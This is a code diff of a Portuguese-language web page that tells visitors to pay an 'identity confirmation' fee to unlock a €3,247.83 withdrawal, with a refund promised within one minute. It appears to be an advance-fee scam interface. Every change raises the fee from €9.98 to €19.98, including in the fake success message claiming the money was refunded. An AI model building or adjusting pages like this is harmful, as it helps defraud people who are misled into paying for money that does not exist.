@@ -233,13 +233,13 @@ const pages = {
           CONFIRMAÇÃO DE IDENTIDADE
         </div>
         <div class="confirmation-fee-amount">
-          € 9.98
+          € 19.98
           <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
         </div>
         <div class="confirmation-fee-description">
           Taxa obrigatória para liberação do saque no valor de
           <span class="bold">€3.247,83</span>. O valor de
-          <span class="bold">€9.98</span> será reembolsado integralmente
+          <span class="bold">€19.98</span> será reembolsado integralmente
           para ti em 1 minuto.
         </div>
       </div>
@@ -280,7 +280,7 @@ const pages = {
                 Pagar taxa de confirmação
               </div>
               <div class="confirmation-requirement-description">
-                € 9.98 para verificação de identidade
+                € 19.98 para verificação de identidade
               </div>
             </div>
           </div>
@@ -320,7 +320,7 @@ const pages = {
           ⏱️ Reembolso automático em 1 minuto
         </div>
         <div class="confirmation-success-message" id="confirmation-success-message">
-          ✅ Identidade confirmada. € 9.98 reembolsados e saque liberado.
+          ✅ Identidade confirmada. € 19.98 reembolsados e saque liberado.
         </div>
       </div>
 
